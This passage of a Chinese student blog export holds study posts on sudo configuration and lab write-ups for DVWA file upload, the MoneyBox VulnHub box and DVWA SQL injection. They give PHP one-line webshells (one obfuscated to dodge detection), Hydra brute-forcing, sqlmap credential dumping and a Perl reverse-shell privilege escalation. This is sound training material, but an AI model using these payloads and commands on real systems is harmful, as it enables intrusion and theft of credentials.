    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="老样子-跟随课程进度"><a href="#老样子-跟随课程进度" class="headerlink" title="老样子 跟随课程进度"></a>老样子 跟随课程进度</h1><h2 id="1）什么是sudo涅？"><a href="#1）什么是sudo涅？" class="headerlink" title="1）什么是sudo涅？"></a>1）什么是sudo涅？</h2><blockquote>
<p>简单的说，sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p>
</blockquote>
<blockquote>
<p>严谨些说，sudo 允许一个已授权用户以超级用户或者其它用户的角色运行一个命令。当然，能做什么不能做什么都是通过安全策略来指定的。sudo 支持插件架构的安全策略，并能把输入输出写入日志。第三方可以开发并发布自己的安全策略和输入输出日志插件，并让它们无缝的和 sudo 一起工作。默认的安全策略记录在 /etc/sudoers 文件中。而安全策略可能需要用户通过密码来验证他们自己。也就是在用户执行 sudo 命令时要求用户输入自己账号的密码。如果验证失败，sudo 命令将会退出。</p>
</blockquote>
<blockquote>
<p>sudo暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。</p>
</blockquote>
<blockquote>
<p>由于不需要超级用户的密码，部分类Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、[Mac OS X]。</p>
</blockquote>
<span id="more"></span>
<h2 id="2）sudo命令语法"><a href="#2）sudo命令语法" class="headerlink" title="2）sudo命令语法"></a>2）sudo命令语法</h2><p><code>sudo [-bhHpV] [-s ] [-u &lt;用户&gt;] [指令]</code><br>或<br><code>sudo [-klv]</code><br>参数<br>-b 在后台执行指令。<br>-h 显示帮助。<br>-H 将HOME环境变量设为新身份的HOME环境变量。<br>-k 结束密码的有效期限，也就是下次再执行sudo时便需要输入密码。<br>-l 列出目前用户可执行与无法执行的指令。<br>-p 改变询问密码的提示符号。<br>-s 执行指定的shell。<br>-u &lt;用户&gt; 以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份。<br>-v 延长密码有效期限5分钟。<br>-V 显示版本信息。<br>-S 从标准输入流替代终端来获取密码</p>
<h2 id="3）基本配置"><a href="#3）基本配置" class="headerlink" title="3）基本配置"></a>3）基本配置</h2><p>系统默认创建了一个名为 sudo 的组。只要把用户加入这个组，用户就具有了 sudo 的权限。<br>至于如何把用户加入 sudo 组，您可以直接编辑 /etc/group 文件，当然您得使用一个有 sudo 权限的用户来干这件事：<br>先创建用户并设置密码后，然后在sudo组中加入该用户，多个用户用逗号隔开。<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/1.png" alt="1.png"><br>添加内容如下：<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/2.png" alt="2.png"><br>我们把用户 testuser 添加到了 sudo 组中，所以当用户 testuser 登录后就可以通过 sudo 命令以 root 权限执行命令了！<br>但是，用testuser执行root权限的命令时会报错：<br>解决办法：<br>1)、切换到root用户下<br>普通用户切换到root用户下：sudo -i<br>root用户切换到普通用户下：su testuser</p>
<p>2)、添加sudo文件的写权限,命令是:<br>chmod u+w /etc/sudoers</p>
<p>3)、编辑sudoers文件<br>vi /etc/sudoers<br>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/3.png" alt="3.png"><br>ps:这里说下你可以sudoers添加下面四行中任意一条<br>youuser ALL=(ALL) ALL<br>%youuser ALL=(ALL) ALL<br>youuser ALL=(ALL) NOPASSWD: ALL<br>%youuser ALL=(ALL) NOPASSWD: ALL</p>
<p>第一行:允许用户youuser执行sudo命令(需要输入密码).<br>第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).<br>第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.<br>第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</p>
<p>4)、撤销sudoers文件写权限,命令:<br>chmod u-w /etc/sudoers</p>
<p>这样普通用户就可以使用sudo了。</p>
<p>4、sudo命令的日志</p>
<p>在 ubuntu 中，sudo 的日志默认被记录在 /var/log/auth.log 文件中。当我们执行 sudo 命令时，相关日志都是会被记录下来的。比如下图中显示的就是一次执行 sudo 命令的日志。<br>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp上传漏洞</title>
    <url>/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<p>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p>
<span id="more"></span>
<p>我们先从<strong>一句话木马</strong>说起</p>
<h1 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1.一句话木马"></a>1.一句话木马</h1><p><code>&lt;?php @eval($_POST['123']);?&gt;</code><br>这便是最简单的一句话木马。<br>这段php代码被分为以下几个部分：<br>**@**表示后面即使执行错了，也不会报错。<br>**eval()**函数表示将括号里的内容当作代码执行。<br><strong>$_POST[‘123’]<strong>表示从页面中获得123这个参数值。<br>也就是说，该页面只要收到了</strong>123</strong>这个密码，就会按照eval()的逻辑去运行。<br>只要了解了该文件的路径，便可以对该机器（利用菜刀或蚁剑）为所欲为了。<br>一句话木马还有很多变种： </p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php @assert($_REQUEST[123]); ?&gt; // GET	数据从url提交
                                     POST	数据采用隐蔽方式提交
                                     REQUEST即支持GET方式、又支持POST方式
&lt;?php $k="ass"."ert"; $k($_REQUSET['123']);?&gt; 
//利用字符串绕过检测的一句话木马
....以下略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2-渗透过程"><a href="#2-渗透过程" class="headerlink" title="2.渗透过程"></a>2.渗透过程</h1><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/ </a></p>
<h2 id="低等级（Security-low）"><a href="#低等级（Security-low）" class="headerlink" title="低等级（Security=low）"></a>低等级（Security=low）</h2><p>我们先通过右下角的<strong>view source</strong>按钮来观察网页代码 寻找规律<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="1"><br>可以看到该网站并没有对上传的文件类型与大小做较为明显的防备<br>漏洞很大<br>那么我们创建一个1.php 在其中加上代码<code>&lt;?php @eval($_POST['123']);?&gt;</code><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.jpg" alt="2"><br>随后登陆网站 上传 完事<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.jpg" alt="3"><br>至于kali下载蚁剑的方式：<a href="https://blog.csdn.net/liver100day/article/details/120222378">参考资料</a><br>我们打开蚁剑 按照网页所给提示 文件被上传在了<br><a href="http://192.168.246.132/dvwa/hackable/uploads/1.php">http://192.168.246.132/dvwa/hackable/uploads/1.php</a> 处<br>在<strong>url地址</strong>中填入前者 在<strong>连接密码</strong>中填入123<br>先<strong>测试链接</strong> 然后按保存<br>测试链接显示成功其实就已经完事了<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.jpg" alt="4"><br>随后研究蚁剑 你便会发现它的功能全备 非常厉害</p>
<h2 id="中等级-（Security-medium）"><a href="#中等级-（Security-medium）" class="headerlink" title="中等级 （Security=medium）"></a>中等级 （Security=medium）</h2><p>我们先通过<strong>DVWA Security</strong>将安全度调整至medium<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.jpg" alt="5"><br>然后继续进入上传漏洞网页 <strong>view source</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.jpg" alt="6"><br>可以看到这次的上传对<strong>上传的文件类型</strong>与<strong>上传的文件大小</strong>做了限制<br>文件类型限制为<strong>jpeg</strong>文件 大小限制在了<strong>100000byte</strong>以内（1KB=1024B byte=B=字节)<br>文件大小由于使用一句话木马 因此可以轻松解决<br>文件类型的问题则可以使用多种方法来解析</p>
<h3 id="1-利用burpsuite"><a href="#1-利用burpsuite" class="headerlink" title="1)利用burpsuite"></a>1)利用burpsuite</h3><p><strong>关于burpsuite的配置</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/7.jpg" alt="7"><br>↑<strong>proxy-proxy setting中设置本地地址与端口</strong><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8.jpg" alt="8"><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/9.jpg" alt="9"><br>配置firefox中的<strong>设置-proxy settings</strong> 注意ip与端口要与前者保持一致<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/10.jpg" alt="10"><br>进入上传漏洞的网页 按这个按钮就能开始监听<br>先分析一下刚才得到的条件：<br>文件类型<strong>仅限jpeg</strong><br>那我们便将<strong>一句话木马.php</strong>文件的后缀更改为<strong>jpeg</strong>交给前端 通过<strong>burpsuite</strong>更改后缀来修改成<strong>php</strong>文件类型<br>那么开始实践<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/11.jpg" alt="11"><br>将<strong>1.php</strong>复制一份备份 其中一份更名为<strong>1.jpeg</strong><br>开启<strong>burpsuite</strong>的监听 将<strong>1.jpeg</strong>上传至网站 等待拦截结果<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/12.jpg" alt="12"><br>网站一直处于加载中 且<strong>burpsuite</strong>显示拦截结果 说明成功拦截<br>我们将<code>filename=“1.jpeg”</code>更改为<code>filename=“1.php”</code><br>随后点击<code>forward</code>放行<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/14.jpg" alt="14"><br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/15.jpg" alt="15"><br>可以看到上传成功 我们继续在蚁剑里测试<br><img data-src="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/16.jpg" alt="16"><br>好的 链接也成功了 这说明目标已完成</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>moneybox解析</title>
    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
<blockquote>
<p>第一步：打开sources.list文件</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo vim /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>第二步：在文件中添加以下内容</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">deb http://http.kali.org/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security sana/updates main contrib non-free
deb http://old.kali.org/kali moto main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>然后保存退出，再进行更新</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
</blockquote>
<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
<pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><em><strong>hydra使用方法:</strong></em></p>
<pre class="line-numbers language-none"><code class="language-none">hydra -l 用户名 -P 密码字典 协议://ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
<blockquote>
<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
</blockquote>
<ol>
<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/webshells/perl
sudo cp perl-reverse-shell.pl /var/www/html/p.php
cd /var/www/html
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<pre class="line-numbers language-none"><code class="language-none">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
<li>开启kali的网站服务<pre class="line-numbers language-none"><code class="language-none">systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
<li>切换到靶机lily会话，通过http协议下载p.php<pre class="line-numbers language-none"><code class="language-none">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
<li>kali 通过nc命令监听1234端口<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
<li>靶机上通过sudo 运行p.php程序<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/perl p.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
<li>切换到渗透机kali，成功反弹管理员权限shell<pre class="line-numbers language-none"><code class="language-none">id
cd /root
ls -a
cat .root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
<li>拿到最终flag啦！<pre class="line-numbers language-none"><code class="language-none">Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==&gt; r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp与sql注入与sqlmap</title>
    <url>/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<h2 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h2><p>首先 我们下载owasp 打开后输入<strong>默认账号</strong>root 与 <strong>默认密码</strong>owaspbwa<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/2.jpg"><br>随后会显示<strong>登录成功</strong> 输入指定ip进入网页<a href="http://192.168.246.132/">http://192.168.246.132</a><br>另开一个<strong>kali</strong> 随后进入网页<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/1.jpg" alt="1.jpg"><br>这里选择<strong>Damn Vulnerable Web Application</strong> 也是我们今天要解析的靶机</p>
<span id="more"></span>
<h2 id="2-靶机部分"><a href="#2-靶机部分" class="headerlink" title="2.靶机部分"></a>2.靶机部分</h2><p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/3.jpg" alt="3.jpg"><br>如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码</p>
<table>
<thead>
<tr>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>password</td>
</tr>
<tr>
<td>gordonb</td>
<td>abc123</td>
</tr>
<tr>
<td>1337</td>
<td>charley</td>
</tr>
<tr>
<td>pablo</td>
<td>letmein</td>
</tr>
<tr>
<td>smithy</td>
<td>password</td>
</tr>
</tbody></table>
<p>进入 选择<strong>SQL Injection</strong><br>首先是测试一下sqlmap</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机地址" //判断目标是否存在sql注入可能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/4.jpg" alt="4.jpg"><br>可以看到它爆出了有注入漏洞 数据库类型为 <strong>mysql</strong> 且所在操作系统为 <strong>linux</strong><br>我们加入一下cookie 尝试爆出数据库看看<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/5.jpg" alt="5.jpg"><br>↑获取cookie请在该页面按f12 切到<strong>network</strong> reload后查看页面详细 其中有cookie</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "目标网址" --cookie "网址cookie" --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看到俩库<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/6.jpg" alt="6.jpg"><br>dvwa和information_schema<br>information_schema是每个mysql数据库都会自带的所以暂且搁置 我们转到dvwa</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 --tables //获取指定数据库表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结果是两个表<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/7.jpg" alt="7.jpg"><br>那我们字面意思来看 guestbook是留言簿 那users明显是用户相关信息了<br>我们查看一下users里的相关信息</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "靶机网址" --cookie="网址cookie" -D 数据库名 -T 表名 --dump //获取指定表中的信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有选项都直接按<strong>enter</strong>默认过去<br><img data-src="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/8.jpg" alt="8.jpg"></p>
<blockquote>
<p>ps: 如果窗口拉的不够长会导致表格被拉伸难以看清 我的建议是在生成结果前尽可能全屏</p>
</blockquote>
<p>password后边的括号里边的内容是解密后破解出的明文密码 前面则是加密后的密文<br>登陆时使用 <strong>user对应的账号</strong> 与 <strong>password中的明文密码</strong> 则ok<br>剩下的等老师继续讲 我们先说到这里</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp文件包含漏洞</title>
